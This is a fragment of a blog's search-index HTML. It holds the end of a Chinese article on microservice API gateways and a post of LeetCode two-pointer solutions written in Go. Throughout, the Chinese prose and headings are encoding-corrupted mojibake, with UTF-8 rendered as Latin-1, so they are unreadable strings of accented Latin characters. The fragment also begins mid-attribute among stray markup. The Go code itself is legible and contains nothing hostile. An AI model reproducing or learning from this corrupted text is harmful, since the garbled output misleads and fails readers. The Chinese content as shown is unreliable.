&lt;p&gt;æ­£å¦‚ä½ æ‰€æ–™ï¼Œä½¿ç”¨ API ç½‘å…³åŒæ ·å­˜åœ¨å¥½å¤„ä¸åå¤„ã€‚ä½¿ç”¨ API ç½‘å…³çš„ä¸»è¦å¥½å¤„æ˜¯å®ƒå°è£…äº†åº”ç”¨çš„å†…éƒ¨ç»“æ„ã€‚å®¢æˆ·ç«¯åªéœ€è¦ä¸ç½‘å…³é€šä¿¡ï¼Œè€Œä¸å¿…è°ƒç”¨ç‰¹å®šçš„æœåŠ¡ã€‚API ç½‘å…³ä¸ºæ¯ç§ç±»å‹çš„å®¢æˆ·ç«¯æä¾›äº†ç‰¹å®šçš„ APIï¼Œå‡å°‘äº†å®¢æˆ·ç«¯ä¸åº”ç”¨ä¹‹é—´çš„å¾€è¿”æ¬¡æ•°ã€‚åŒæ—¶ï¼Œå®ƒè¿˜ç®€åŒ–äº†å®¢æˆ·ç«¯çš„ä»£ç ã€‚&lt;/p&gt;
&lt;p&gt;API ç½‘å…³ä¹Ÿå­˜åœ¨ä¸€äº›ç¼ºç‚¹ï¼Œå®ƒæœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªé«˜åº¦å¯ç”¨çš„ç»„ä»¶ï¼Œéœ€è¦å¼€å‘ã€éƒ¨ç½²å’Œç®¡ç†ã€‚å¦å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªé£é™©æ˜¯ API ç½‘å…³å¯èƒ½ä¼šæˆä¸ºå¼€å‘ç“¶é¢ˆã€‚å¼€å‘äººå‘˜å¿…é¡»æ›´æ–° API ç½‘å…³æ¥æš´éœ²æ¯ä¸ªå¾®æœåŠ¡çš„ç«¯ç‚¹ã€‚&lt;/p&gt;
&lt;p&gt;é‡è¦çš„æ˜¯æ›´æ–° API ç½‘å…³çš„è¿‡ç¨‹åº”å°½å¯èƒ½åœ°æ”¾ç¼“ä¸€äº›ã€‚å¦åˆ™ï¼Œå¼€å‘äººå‘˜å°†è¢«è¿«æ’é˜Ÿç­‰å¾…ç½‘å…³æ›´æ–°ã€‚å°½ç®¡ API ç½‘å…³å­˜åœ¨è¿™äº›ç¼ºç‚¹ï¼Œä½†å¯¹äºå¤§å¤šæ•°çš„çœŸå®åº”ç”¨æ¥è¯´ï¼Œä½¿ç”¨ API ç½‘å…³æ˜¯æ­£ç¡®çš„ã€‚&lt;/p&gt;
&lt;h2 id=&#34;å®ç°-api-ç½‘å…³&#34;&gt;å®ç° API ç½‘å…³&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬å·²ç»äº†è§£äº†ä½¿ç”¨ API ç½‘å…³çš„åŠ¨æœºå’Œåˆ©å¼Šï¼Œæ¥ä¸‹æ¥è®©æˆ‘ä»¬çœ‹çœ‹ä½ éœ€è¦è€ƒè™‘çš„å„ç§è®¾è®¡é—®é¢˜ã€‚&lt;/p&gt;
&lt;h3 id=&#34;æ€§èƒ½ä¸å¯æ‰©å±•æ€§&#34;&gt;æ€§èƒ½ä¸å¯æ‰©å±•æ€§&lt;/h3&gt;
&lt;p&gt;åªæœ‰å°‘æ•°å…¬å¸èƒ½è¾¾åˆ° Netflix çš„è¿è¥è§„æ¨¡ï¼Œæ¯å¤©éœ€è¦å¤„ç†æ•°åäº¿çš„è¯·æ±‚ã€‚ä¸ç®¡æ€æ ·ï¼Œå¯¹äºå¤§å¤šæ•°åº”ç”¨æ¥è¯´ï¼ŒAPI ç½‘å…³çš„æ€§èƒ½å’Œå¯æ‰©å±•æ€§æ˜¯ç›¸å½“é‡è¦çš„ã€‚å› æ­¤ï¼Œåœ¨ä¸€ä¸ªæ”¯æŒå¼‚æ­¥ã€éé˜»å¡ I/O å¹³å°ä¸Šæ„å»º API ç½‘å…³æ˜¯å¾ˆæœ‰å¿…è¦çš„ã€‚å®ç°ä¸€ä¸ªå¯æ‰©å±•çš„ API ç½‘å…³çš„æŠ€æœ¯å¤šç§å¤šæ ·ã€‚åœ¨ JVM ä¸Šï¼Œä½ å¯ä»¥ä½¿ç”¨åŸºäº NIO çš„æ¡†æ¶ï¼Œå¦‚ Nettyã€Vertxã€Spring Reactor æˆ–è€… JBoss Undertowã€‚ä¸€ä¸ªæµè¡Œçš„é JVM é€‰æ‹©æ˜¯ä½¿ç”¨ Node.jsï¼Œå®ƒæ˜¯ä¸€ä¸ªå»ºç«‹åœ¨ Chrome çš„ JavaScript å¼•æ“ä¹‹ä¸Šçš„å¹³å°ã€‚æ­¤å¤–ï¼Œä½ è¿˜å¯ä»¥é€‰æ‹©ä½¿ç”¨ NGINX Plusã€‚&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.nginx.com/solutions/api-gateway/&#34;&gt;NGINX Plus&lt;/a&gt; æä¾›äº†ä¸€ä¸ªæˆç†Ÿã€å¯æ‰©å±•å’Œé«˜æ€§èƒ½çš„ Web æœåŠ¡å™¨å’Œåå‘ä»£ç†ï¼Œå®ƒæ˜“äºéƒ¨ç½²ã€é…ç½®å’Œç¼–ç¨‹ã€‚NGINX Plus å¯ä»¥ç®¡ç†èº«ä»½éªŒè¯ã€è®¿é—®æ§åˆ¶ã€è´Ÿè½½å‡è¡¡è¯·æ±‚ã€ç¼“å­˜å“åº”ï¼Œå¹¶ä¸”æä¾›äº†åº”ç”¨å¥åº·æ£€æŸ¥å’Œç›‘æ§åŠŸèƒ½ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ä½¿ç”¨å“åº”å¼ç¼–ç¨‹æ¨¡å‹&#34;&gt;ä½¿ç”¨å“åº”å¼ç¼–ç¨‹æ¨¡å‹&lt;/h3&gt;
&lt;p&gt;API ç½‘å…³å¤„ç†å¤§éƒ¨åˆ†è¯·æ±‚åªæ˜¯ç®€å•çš„æŠŠå®ƒä»¬è·¯ç”±åˆ°ä¸ä¹‹å¯¹åº”çš„åç«¯æœåŠ¡ã€‚å®ƒé€šè¿‡è°ƒç”¨å¤šä¸ªåç«¯æœåŠ¡æ¥å¤„ç†å…¶ä»–è¯·æ±‚å¹¶èšåˆç»“æœã€‚å¯¹äºæŸäº›è¯·æ±‚ï¼Œå¦‚äº§å“è¯¦ç»†ä¿¡æ¯è¯·æ±‚ï¼Œå¯¹åç«¯æœåŠ¡è¯·æ±‚è€Œè¨€æ˜¯å½¼æ­¤ç‹¬ç«‹çš„ã€‚ä¸ºäº†æŠŠå“åº”æ—¶é—´ç¼©çŸ­åˆ°æœ€å°ï¼ŒAPI ç½‘å…³åº”è¯¥å¹¶å‘æ‰§è¡Œç‹¬ç«‹è¯·æ±‚ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶è€Œï¼Œæœ‰æ—¶å€™ï¼Œè¯·æ±‚æ˜¯ç›¸äº’ä¾èµ–çš„ã€‚é¦–å…ˆï¼ŒAPI ç½‘å…³å¯èƒ½éœ€è¦åœ¨å°†è¯·æ±‚è·¯ç”±åˆ°åç«¯æœåŠ¡ä¹‹å‰ï¼Œé€šè¿‡è°ƒç”¨éªŒè¯æœåŠ¡æ¥éªŒè¯è¯¥è¯·æ±‚ã€‚åŒæ ·ï¼Œä¸ºäº†ä»å®¢æˆ·çš„æ„¿æœ›æ¸…å•ä¸­è·å–äº§å“ä¿¡æ¯ï¼ŒAPI ç½‘å…³é¦–å…ˆå¿…é¡»æ£€ç´¢åŒ…å«è¯¥ä¿¡æ¯çš„å®¢æˆ·èµ„æ–™ï¼Œç„¶åæ£€ç´¢æ¯ä¸ªäº§å“çš„ä¿¡æ¯ã€‚è¿˜æœ‰ä¸€ä¸ªæœ‰è¶£çš„ API ç»„åˆæ¡ˆä¾‹æ˜¯ &lt;a href=&#34;http://techblog.netflix.com/2013/02/rxjava-netflix-api.html&#34;&gt;Netflix è§†é¢‘ç½‘æ ¼&lt;/a&gt;ã€‚&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨ä¼ ç»Ÿçš„å¼‚æ­¥å›è°ƒæ–¹å¼æ¥ç¼–å†™ API ç»„åˆä»£ç ä¼šå¾ˆå¿«ä½¿ä½ é™·å…¥å›è°ƒåœ°ç‹±ã€‚ä»£ç å°†ä¼šå˜å¾—æ‚ä¹±ã€éš¾ä»¥ç†è§£å¹¶ä¸”å®¹æ˜“å‡ºé”™ã€‚æ›´å¥½çš„æ–¹å¼æ˜¯ä½¿ç”¨å“åº”å¼æ–¹æ³•ä»¥å£°æ˜å¼æ–¹å¼ç¼–å†™ API ç½‘å…³ä»£ç ã€‚å“åº”å¼æŠ½è±¡çš„ä¾‹å­åŒ…æ‹¬ Scala çš„ &lt;a href=&#34;http://docs.scala-lang.org/overviews/core/futures.html&#34;&gt;Future&lt;/a&gt;ã€Java 8 ä¸­çš„ &lt;a href=&#34;https://docs.oracle.com/javase/8/docs/api/java/util/concurrent/CompletableFuture.html&#34;&gt;CompletableFuture&lt;/a&gt; å’Œ JavaScript ä¸­çš„ &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise&#34;&gt;Promise&lt;/a&gt;ã€‚è¿˜æœ‰ &lt;a href=&#34;http://reactivex.io&#34;&gt;Reactive Extensions&lt;/a&gt;ï¼ˆä¹Ÿç§°ä¸º Rx æˆ– ReactiveXï¼‰ï¼Œæœ€åˆç”± Microsoft ä¸º .NET å¹³å°å¼€å‘ã€‚Netflix ä¸º JVM åˆ›å»ºäº† RxJavaï¼Œä¸“é—¨åº”ç”¨åœ¨å®ƒçš„ API ç½‘å…³ã€‚è¿˜æœ‰ç”¨äº JavaScript çš„ RxJSï¼Œå®ƒå¯ä»¥åœ¨æµè§ˆå™¨å’Œ Node.js ä¸­è¿è¡Œã€‚ä½¿ç”¨å“åº”å¼å¯è®©ä½ èƒ½å¤Ÿç¼–å†™å‡ºç®€å•è€Œé«˜æ•ˆçš„ API ç½‘å…³ä»£ç ã€‚&lt;/p&gt;
&lt;h3 id=&#34;æœåŠ¡è°ƒç”¨&#34;&gt;æœåŠ¡è°ƒç”¨&lt;/h3&gt;
&lt;p&gt;åŸºäºå¾®æœåŠ¡çš„åº”ç”¨æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿï¼Œå¿…é¡»ä½¿ç”¨è¿›ç¨‹é—´ï¼ˆinter-processï¼‰é€šä¿¡æœºåˆ¶ã€‚æœ‰ä¸¤ç§è¿›ç¨‹é—´é€šä¿¡æ–¹æ¡ˆã€‚ä¸€æ˜¯ä½¿ç”¨åŸºäºæ¶ˆæ¯çš„&lt;strong&gt;å¼‚æ­¥æœºåˆ¶&lt;/strong&gt;ã€‚æŸäº›å®ç°é‡‡ç”¨äº†æ¶ˆæ¯ä»£ç†ï¼Œå¦‚ JMS å’Œ AMQPã€‚å…¶ä»–é‡‡ç”¨æ— ä»£ç†çš„æ–¹å¼ç›´æ¥ä¸æœåŠ¡é€šä¿¡ï¼Œå¦‚ Zeromqã€‚&lt;/p&gt;
&lt;p&gt;å¦ä¸€ç§ç±»å‹çš„è¿›ç¨‹é—´é€šä¿¡é‡‡ç”¨äº†&lt;strong&gt;åŒæ­¥æœºåˆ¶&lt;/strong&gt;ï¼Œå¦‚ HTTP å’Œ Thrift(RPCæ¡†æ¶)ã€‚ç³»ç»Ÿé€šå¸¸ä¼šåŒæ—¶ä½¿ç”¨å¼‚æ­¥å’ŒåŒæ­¥æ–¹å¼ã€‚ç”šè‡³å¯ä»¥ä¸ºæ¯ç§æ–¹å¼åº”ç”¨å¤šä¸ªå®ç°ã€‚å› æ­¤ï¼ŒAPI ç½‘å…³éœ€è¦æ”¯æŒå„ç§é€šä¿¡æœºåˆ¶ã€‚&lt;/p&gt;
&lt;h3 id=&#34;æœåŠ¡å‘ç°&#34;&gt;æœåŠ¡å‘ç°&lt;/h3&gt;
&lt;p&gt;API ç½‘å…³éœ€è¦çŸ¥é“ä¸å…¶é€šä¿¡çš„æ¯ä¸ªå¾®æœåŠ¡çš„ä½ç½®ï¼ˆIP åœ°å€å’Œç«¯å£ï¼‰ã€‚åœ¨ä¼ ç»Ÿåº”ç”¨ä¸­ï¼Œä½ å¯ä»¥å°†è¿™äº›ä½ç½®ç¡¬ç¼–ç ï¼Œä½†åœ¨ç°ä»£åŸºäºäº‘çš„å¾®æœåŠ¡åº”ç”¨ä¸­ï¼Œæ‰¾åˆ°æ‰€éœ€çš„ä½ç½®ä¸æ˜¯ä¸€ä»¶ç®€å•çš„äº‹æƒ…ã€‚&lt;/p&gt;
&lt;p&gt;åŸºç¡€è®¾æ–½æœåŠ¡ï¼ˆæ¯”å¦‚æ¶ˆæ¯ä»£ç†ï¼‰é€šå¸¸éƒ½æœ‰ä¸€ä¸ªå¯ä»¥é€šè¿‡ç³»ç»Ÿç¯å¢ƒå˜é‡æ¥æŒ‡å®šçš„é™æ€ä½ç½®ã€‚ä½†æ˜¯ï¼Œè¦ç¡®å®šåº”ç”¨æœåŠ¡çš„ä½ç½®å¹¶ä¸æ˜¯é‚£ä¹ˆå®¹æ˜“ã€‚&lt;/p&gt;
&lt;p&gt;åº”ç”¨æœåŠ¡å¯ä»¥åŠ¨æ€åˆ†é…ä½ç½®ã€‚æ­¤å¤–ï¼Œç”±äºè‡ªåŠ¨æ‰©ç¼©å’Œå‡çº§ï¼Œä¸€ä¸ªæœåŠ¡çš„æ•´ç»„å®ä¾‹å¯ä»¥åŠ¨æ€å˜æ›´ã€‚å› æ­¤ï¼ŒAPI ç½‘å…³ä¸ç³»ç»Ÿä¸­çš„ä»»ä½•å…¶ä»–æœåŠ¡å®¢æˆ·ç«¯ä¸€æ ·ï¼Œéœ€è¦ä½¿ç”¨ç³»ç»Ÿçš„æœåŠ¡å‘ç°æœºåˆ¶ï¼š&lt;a href=&#34;http://microservices.io/patterns/server-side-discovery.html&#34;&gt;æœåŠ¡ç«¯å‘ç°&lt;/a&gt;æˆ–&lt;a href=&#34;http://microservices.io/patterns/client-side-discovery.html&#34;&gt;å®¢æˆ·ç«¯å‘ç°&lt;/a&gt;ã€‚&lt;a href=&#34;&#34;&gt;ç¬¬å››ç« &lt;/a&gt;ä¸­æ›´è¯¦ç»†åœ°æè¿°äº†æœåŠ¡å‘ç°ã€‚ç°åœ¨éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœç³»ç»Ÿä½¿ç”¨å®¢æˆ·ç«¯å‘ç°ï¼ŒAPI ç½‘å…³å¿…é¡»èƒ½å¤ŸæŸ¥è¯¢&lt;a href=&#34;http://microservices.io/patterns/service-registry.html&#34;&gt;æœåŠ¡æ³¨å†Œä¸­å¿ƒ&lt;/a&gt;ï¼Œæ³¨å†Œä¸­å¿ƒæ˜¯æ‰€æœ‰å¾®æœåŠ¡å®ä¾‹åŠå…¶ä½ç½®çš„æ•°æ®åº“ã€‚&lt;/p&gt;
&lt;h3 id=&#34;å¤„ç†å±€éƒ¨æ•…éšœ&#34;&gt;å¤„ç†å±€éƒ¨æ•…éšœ&lt;/h3&gt;
&lt;p&gt;å®ç° API ç½‘å…³æ—¶å¿…é¡»è§£å†³çš„å¦ä¸€ä¸ªé—®é¢˜æ˜¯å±€éƒ¨æ•…éšœé—®é¢˜ã€‚å½“ä¸€ä¸ªæœåŠ¡è°ƒç”¨å¦ä¸€ä¸ªå“åº”ç¼“æ…¢æˆ–è€…ä¸å¯ç”¨çš„æœåŠ¡æ—¶ï¼Œæ‰€æœ‰åˆ†å¸ƒå¼ç³»ç»Ÿéƒ½ä¼šå‡ºç°æ­¤é—®é¢˜ã€‚API ç½‘å…³ä¸åº”è¯¥æ— æœŸé™åœ°ç­‰å¾…ä¸‹æ¸¸æœåŠ¡ã€‚ä½†æ˜¯ï¼Œå¦‚ä½•å¤„ç†æ•…éšœå–å†³äºç‰¹å®šçš„æ–¹æ¡ˆå’Œå“ªäº›æœåŠ¡å‘ç”Ÿæ•…éšœã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ¨èæœåŠ¡åœ¨è·å–äº§å“è¯¦ç»†ä¿¡æ¯æ—¶æ²¡æœ‰å“åº”ï¼ŒAPI ç½‘å…³åº”å°†å…¶ä½™çš„äº§å“è¯¦ç»†ä¿¡æ¯è¿”å›ç»™å®¢æˆ·ç«¯ï¼Œå› ä¸ºè¿™äº›ä¿¡æ¯å¯¹ç”¨æˆ·ä»ç„¶æœ‰ç”¨ã€‚å»ºè®®å¯ä»¥æ˜¯ç©ºçš„ï¼Œä¹Ÿå¯ä»¥ç”¨å…¶å®ƒå†…å®¹ä»£æ›¿ï¼Œä¾‹å¦‚ç¡¬ç¼–ç çš„åå¼ºæ’è¡Œåå•ã€‚ç„¶è€Œï¼Œå¦‚æœäº§å“ä¿¡æ¯æœåŠ¡æ²¡æœ‰å“åº”ï¼Œé‚£ä¹ˆ API ç½‘å…³åº”è¯¥å‘å®¢æˆ·ç«¯è¿”å›é”™è¯¯ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœå¯ä»¥ï¼ŒAPI ç½‘å…³è¿˜å¯ä»¥è¿”å›ç¼“å­˜æ•°æ®ã€‚ä¾‹å¦‚ï¼Œç”±äºäº§å“ä»·æ ¼å˜åŒ–ä¸å¤§ï¼Œå½“ä»·æ ¼æœåŠ¡ä¸å¯ç”¨æ—¶ï¼ŒAPI ç½‘å…³å¯ä»¥è¿”å›è¢«ç¼“å­˜çš„ä»·æ ¼æ•°æ®ã€‚æ•°æ®å¯ä»¥ç”± API ç½‘å…³ç¼“å­˜æˆ–å­˜å‚¨åœ¨å¤–éƒ¨ç¼“å­˜ä¸­ï¼Œå¦‚ Redis æˆ– Memcachedã€‚API ç½‘å…³é€šè¿‡è¿”å›é»˜è®¤æ•°æ®æˆ–ç¼“å­˜æ•°æ®ï¼Œç¡®ä¿ç³»ç»Ÿå‘ç”Ÿæ•…éšœæ—¶æœ€å°ç¨‹åº¦ä¸Šå½±å“åˆ°ç”¨æˆ·ä½“éªŒã€‚&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/Netflix/Hystrix&#34;&gt;Netflix Hystrix&lt;/a&gt; æ˜¯ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„åº“ï¼Œç”¨äºç¼–å†™è°ƒç”¨è¿œç¨‹æœåŠ¡ä»£ç ã€‚Hystrix å¯ä»¥ä½¿è¶…å‡ºæŒ‡å®šé˜ˆå€¼çš„è°ƒç”¨è¶…æ—¶ã€‚å®ƒå®ç°äº†æ–­è·¯å™¨æ¨¡å¼ï¼Œé˜²æ­¢å®¢æˆ·ç«¯ä¸å¿…è¦åœ°ç­‰å¾…æ— å“åº”çš„æœåŠ¡ã€‚å¦‚æœæœåŠ¡çš„é”™è¯¯ç‡è¶…è¿‡æŒ‡å®šé˜ˆå€¼ï¼ŒHystrix å°†ä¼šè·³é—¸ï¼Œæ‰€æœ‰è¯·æ±‚å°†åœ¨æŒ‡å®šçš„æ—¶é—´å†…ç«‹å³å¤±è´¥ã€‚Hystrix å…è®¸ä½ åœ¨è¯·æ±‚å¤±è´¥æ—¶å®šä¹‰å›é€€æ“ä½œï¼Œä¾‹å¦‚ä»ç¼“å­˜è¯»å–æˆ–è¿”å›é»˜è®¤å€¼ã€‚å¦‚æœä½ æ­£åœ¨ä½¿ç”¨ JVMï¼Œé‚£ä¹ˆä½ ä¸€å®šè¦è€ƒè™‘ä½¿ç”¨ Hystrixã€‚å¦‚æœä½ æ˜¯åœ¨é JVM ç¯å¢ƒä¸­è¿è¡Œï¼Œåˆ™åº”ä½¿ç”¨ç›¸åŒåŠŸèƒ½çš„åº“ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æ€»ç»“&#34;&gt;æ€»ç»“&lt;/h2&gt;
&lt;p&gt;å¯¹äºå¤§å¤šæ•°åŸºäºå¾®æœåŠ¡çš„åº”ç”¨æ¥è¯´ï¼Œå®ç°ä¸€ä¸ª API ç½‘å…³æ˜¯å¾ˆæœ‰å¿…è¦çš„ï¼ŒAPI ç½‘å…³ä½œä¸ºç³»ç»Ÿçš„å•å…¥å£ç‚¹ï¼Œå¹¶ä¸”è´Ÿè´£è¯·æ±‚è·¯ç”±ï¼Œç»„åˆå’Œåè®®è½¬æ¢ã€‚å®ƒä¸ºæ¯ä¸ªåº”ç”¨å®¢æˆ·ç«¯æä¾›äº†ä¸€ä¸ªè‡ªå®šä¹‰ APIã€‚API ç½‘å…³è¿˜å¯ä»¥é€šè¿‡è¿”å›ç¼“å­˜æˆ–é»˜è®¤æ•°æ®æ¥æ©ç›–åç«¯æœåŠ¡æ•…éšœã€‚åœ¨ä¸‹ä¸€ç« ä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç»æœåŠ¡é—´çš„é€šä¿¡ã€‚&lt;/p&gt;
">å¾®æœåŠ¡APIç½‘å…³</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/k8s-01-he-xin-ji-zhu/"" data-c="
          &lt;p&gt;--&lt;/p&gt;
">ã€k8sã€‘æ ¸å¿ƒæŠ€æœ¯</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/suan-fa-shuang-zhi-zhen/"" data-c="
          &lt;h2 id=&#34;åŒæŒ‡é’ˆ&#34;&gt;åŒæŒ‡é’ˆ&lt;/h2&gt;
&lt;h3 id=&#34;ç§»é™¤å…ƒç´ &#34;&gt;ç§»é™¤å…ƒç´ &lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/remove-element/&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684468855.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func removeElement(nums []int, val int) int {
    var end int = len(nums) - 1
    var start int = 0

    for start &amp;lt;= end {
        for nums[start] == val &amp;amp;&amp;amp; start &amp;lt;= end {
            nums[start] = nums[end]
            end--
        }
        start ++
    }

    return end + 1
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;å‰‘æŒ‡offer-05æ›¿æ¢ç©ºæ ¼&#34;&gt;å‰‘æŒ‡Offer 05.æ›¿æ¢ç©ºæ ¼&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/ti-huan-kong-ge-lcof/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func replaceSpace(s string) string {
    s2byte := make([]byte, len(s))
    emptycnt := 0
    for i := 0; i &amp;lt; len(s); i++ {
        if s[i] == &#39; &#39; {
            emptycnt ++
        }
    }

    for emptycnt &amp;gt; 0 {
        emptycnt --
        s2byte = append(s2byte, &#39; &#39;, &#39; &#39;)
    }

    for i, j := len(s)-1, len(s2byte)-1; i &amp;gt;= 0; {
        if s[i] == &#39; &#39; {
            s2byte[j] = &#39;0&#39;
            s2byte[j-1] = &#39;2&#39;
            s2byte[j-2] = &#39;%&#39;
            j -= 3
        } else {
            s2byte[j] = s[i]
            j --
        }
        i --
    }
    res := string(s2byte)
    return res
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ç§»é™¤å…ƒç´ -2&#34;&gt;ç§»é™¤å…ƒç´ &lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/remove-element/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/*
å› ä¸ºä¸è¦æ±‚å…ƒç´ æŒ‰ç…§ä¹‹å‰çš„æ’åˆ—ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨åŒæŒ‡é’ˆï¼Œä¸€ä¸ªæŒ‡é’ˆä»å‰å¾€åç”¨æ¥æ‰«ææ•°ç»„ï¼Œå¦ä¸€ä¸ªæŒ‡é’ˆä»åå¾€å‰å°†åé¢çš„å…ƒç´ æ·»åŠ åˆ°åˆ é™¤å…ƒç´ åçš„ç©ºä½
*/
func removeElement(nums []int, val int) int {
    var end int = len(nums) - 1
    var start int = 0

    for start &amp;lt;= end {
        for nums[start] == val &amp;amp;&amp;amp; start &amp;lt;= end {
            nums[start] = nums[end]
            end--
        }
        start ++
    }

    return end + 1
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ä¸‰æ•°ä¹‹å’Œ&#34;&gt;ä¸‰æ•°ä¹‹å’Œ&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/3sum/&lt;/p&gt;
&lt;p&gt;æ–¹å¼æ˜¯å…ˆå¯¹æ•°ç»„è¿›è¡Œæ’åºï¼Œç„¶åé€šè¿‡åŒé‡å¾ªç¯ï¼Œå¤–å±‚iéå†æ•´ä¸ªæ•°ç»„ï¼Œå†…å±‚é€šè¿‡åŒæŒ‡é’ˆ&lt;code&gt;left=i+1, right=len-1&lt;/code&gt;&lt;br&gt;
å¦‚æœä¸‰æ•°ä¹‹å’Œå¤§äº0ï¼Œåˆ™&lt;code&gt;left++&lt;/code&gt;&lt;br&gt;
å¦‚æœä¸‰æ•°ä¹‹å’Œå°äº0ï¼Œåˆ™&lt;code&gt;right--&lt;/code&gt;&lt;br&gt;
å› ä¸ºä¸èƒ½æœ‰é‡å¤çš„ç­”æ¡ˆï¼Œiå’Œleftéƒ½éœ€è¦çœ‹æ˜¯ä¸æ˜¯å’Œä¸Šä¸€ä¸ªå…ƒç´ ç›¸åŒ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;import (
    &amp;quot;sort&amp;quot;
)
func threeSum(nums []int) [][]int {
    res := make([][]int, 0)
    var left, right, length int
    length = len(nums)
    sort.Ints(nums)
    for i := 0; i &amp;lt; length; i++ {
        if i &amp;gt; 0 &amp;amp;&amp;amp; nums[i] == nums[i-1] {
            continue
        }
        left = i + 1
        right = length - 1
        for left &amp;lt; right {
            if left &amp;gt; i + 1 &amp;amp;&amp;amp; nums[left] == nums[left-1] {
                left ++
                continue
            }
            if nums[i] + nums[left] + nums[right] &amp;gt; 0 {
                right --
            } else if nums[i] + nums[left] + nums[right] &amp;lt; 0 {
                left ++
            } else {
                res = append(res, []int{nums[i], nums[left], nums[right]})
                left ++
            }
        }
    }
    return res
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;å››æ•°ä¹‹å’Œ&#34;&gt;å››æ•°ä¹‹å’Œ&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/4sum/&lt;/p&gt;
&lt;p&gt;å’Œä¸‰æ•°ä¹‹å’Œç±»ä¼¼ï¼Œåªæ˜¯å¤šåŠ äº†ä¸€å±‚å¾ªç¯&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;import &amp;quot;sort&amp;quot;
func fourSum(nums []int, target int) [][]int {
    sort.Ints(nums)
    ans := make([][]int, 0)
    llen := len(nums)
    for i := 0; i &amp;lt; llen; i++ {
        if i &amp;gt; 0 &amp;amp;&amp;amp; nums[i] == nums[i - 1] {
            continue
        }
        for j := i + 1; j &amp;lt; llen; j++ {
            if j &amp;gt; i + 1 &amp;amp;&amp;amp; nums[j] == nums[j - 1] {
                continue
            }
            left := j + 1
            right := llen - 1
            for left &amp;lt; right {
                if left &amp;gt; j + 1 &amp;amp;&amp;amp; nums[left] == nums[left - 1] {
                    left ++
                    continue
                }
                if nums[i] + nums[j] + nums[left] + nums[right] &amp;gt; target {
                    right --
                } else if nums[i] + nums[j] + nums[left] + nums[right] &amp;lt; target {
                    left ++
                } else {
                    ans = append(ans, []int{nums[i], nums[j], nums[left], nums[right]})
                    left ++
                }
            }
        }
    }
    return ans
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;åè½¬å­—ç¬¦ä¸²é‡Œçš„å•è¯&#34;&gt;åè½¬å­—ç¬¦ä¸²é‡Œçš„å•è¯&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/reverse-words-in-a-string/&lt;/p&gt;
&lt;p&gt;é¦–å…ˆå°†å­—ç¬¦ä¸²ä¸­çš„å¤šä½™ç©ºæ ¼å»ï¼Œå¯ä»¥ä½¿ç”¨https://leetcode-cn.com/problems/remove-element/é‡Œçš„æ€æƒ³ï¼Œç„¶åå°†æ•´ä¸ªå­—ç¬¦ä¸²é€†åºï¼Œç„¶åå†å°†å­—ç¬¦ä¸²çš„æ¯ä¸ªå•è¯è¿›è¡Œåè½¬å°±å¯ä»¥äº†&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// ç›´æ¥ä½¿ç”¨å†…ç½®å‡½æ•°ï¼Œè¿™ç§æ–¹å¼å°±æ˜¯ç†Ÿæ‚‰ä¸€ä¸‹goä¸­çš„å­—ç¬¦ä¸²æ“ä½œè¿˜å¯ä»¥
import &amp;quot;strings&amp;quot;

func reverse(strsplit []string) []string {
    for i, j := 0, len(strsplit)-1; i &amp;lt; j; i, j = i+1, j-1 {
        strsplit[i], strsplit[j] = strsplit[j], strsplit[i]
    }
    return strsplit
}

func reverseWords(s string) string {
    splitstr := reverse(strings.Fields(s))
    return strings.Join(splitstr, &amp;quot; &amp;quot;)
}


// ç¬¬äºŒç§æ–¹å¼å°±æ˜¯ä¸Šé¢è¯´çš„
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;é“¾è¡¨ç›¸äº¤&#34;&gt;é“¾è¡¨ç›¸äº¤â€»&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/intersection-of-two-linked-lists-lcci/&lt;/p&gt;
